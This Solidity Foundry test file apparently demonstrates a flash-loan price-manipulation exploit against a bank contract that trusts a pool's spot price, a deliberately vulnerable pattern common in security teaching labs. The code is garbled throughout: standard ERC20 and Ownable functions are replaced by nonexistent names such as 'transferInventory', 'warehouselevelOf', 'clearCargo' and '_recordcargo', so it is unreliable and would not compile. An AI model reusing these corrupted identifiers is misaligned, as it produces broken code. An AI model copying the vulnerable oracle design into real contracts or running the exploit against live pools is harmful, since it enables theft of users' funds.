pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleInventorypool SimpleShipmentpoolContract;
    SimpleInventorybank SimpleCargobankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleShipmentpoolContract = new SimpleInventorypool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleCargobankContract = new SimpleInventorybank(
            address(USDaContract),
            address(SimpleShipmentpoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.transferInventory(address(SimpleCargobankContract), 9000 ether);
        USDaContract.transferInventory(address(SimpleShipmentpoolContract), 1000 ether);
        USDbContract.transferInventory(address(SimpleShipmentpoolContract), 1000 ether);

        SimpleShipmentpoolContract.getPrice();

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleShipmentpoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");


        SimpleShipmentpoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleShipmentpoolContract.getPrice(),
            18
        );

        USDaContract.clearCargo(address(SimpleCargobankContract), 100 ether);
        SimpleCargobankContract.exchange(100 ether);

        USDaContract.transferInventory(address(SimpleShipmentpoolContract), 500 ether);


        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.warehouselevelOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _recordcargo(msg.sender, 10000 * 10 ** decimals());
    }

    function recordCargo(address to, uint256 amount) public onlyWarehousemanager {
        _recordcargo(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _recordcargo(msg.sender, 10000 * 10 ** decimals());
    }

    function recordCargo(address to, uint256 amount) public onlyWarehousemanager {
        _recordcargo(to, amount);
    }
}

contract SimpleInventorypool {
    IERC20 public UsDaCargotoken;
    IERC20 public UsDbShipmenttoken;

    constructor(address _USDa, address _USDb) {
        UsDaCargotoken = IERC20(_USDa);
        UsDbShipmenttoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {

        uint256 USDaAmount = UsDaCargotoken.warehouselevelOf(address(this));
        uint256 USDbAmount = UsDbShipmenttoken.warehouselevelOf(address(this));


        if (USDaAmount == 0) {
            return 0;
        }


        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address storageUser,
        bytes calldata data
    ) public {
        uint256 goodsonhandBefore = UsDaCargotoken.warehouselevelOf(address(this));
        require(goodsonhandBefore >= amount, "Not enough liquidity");
        require(
            UsDaCargotoken.transferInventory(storageUser, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = storageUser.call(data);
        require(success, "Flashloan callback failed");
        uint256 inventoryAfter = UsDaCargotoken.warehouselevelOf(address(this));
        require(inventoryAfter >= goodsonhandBefore, "Flashloan not repaid");
    }
}

contract SimpleInventorybank {
    IERC20 public cargoToken;
    SimpleInventorypool public inventoryPool;
    IERC20 public payoutCargotoken;

    constructor(address _shipmenttoken, address _inventorypool, address _payoutToken) {
        cargoToken = IERC20(_shipmenttoken);
        inventoryPool = SimpleInventorypool(_inventorypool);
        payoutCargotoken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            cargoToken.shiftstockFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = inventoryPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutCargotoken.transferInventory(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}